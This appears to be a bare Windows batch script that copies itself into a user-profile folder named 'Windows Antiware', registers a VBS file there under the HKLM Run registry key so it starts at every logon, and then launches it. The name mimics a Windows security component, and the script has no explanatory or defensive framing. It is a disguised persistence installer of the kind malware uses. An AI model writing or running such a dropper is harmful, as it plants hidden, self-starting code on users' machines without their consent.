mkdir "%USERPROFILE%\\Windows Antiware"
xcopy "%CD%" "%USERPROFILE%\\Windows Antiware" /Y
REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsAntiware /t REG_EXPAND_SZ /d "%USERPROFILE%\Windows Antiware\Windows Antiware.vbs" /f
"%USERPROFILE%\\Windows Antiware\Windows Antiware.vbs"